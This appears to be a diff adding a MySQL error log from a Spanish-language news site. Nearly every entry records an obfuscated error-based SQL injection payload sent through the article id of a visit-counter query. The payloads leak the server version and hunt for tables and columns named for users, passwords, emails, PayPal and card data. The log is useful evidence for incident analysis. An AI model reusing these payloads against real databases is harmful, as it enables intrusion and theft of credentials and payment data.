@@ -1,0 +1,115 @@
+Time : 23:41:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x257573657225)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:41:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x2570617373776f726425)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:41:18
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x25636325)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:41:16
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x2570617970616c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:41:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:41:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:11:58
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x257573657225)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:11:47
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x257573657225)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:11:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x257573657225)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:10:52
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x2570617373776f726425)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:10:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x25636325)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:10:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x2570617970616c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:10:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:10:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 23:10:08
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 14:08:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=3420'A=0
+
+Time : 11:17:48
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25636f6e747261736525)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 11:17:45
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25636f7272656f25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 11:17:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x257061737325)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 11:17:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 11:17:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 11:17:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 11:17:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 11:17:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 10:27:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x257061737325)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 10:27:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x25656d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 10:27:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 10:27:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 10:27:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.34-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
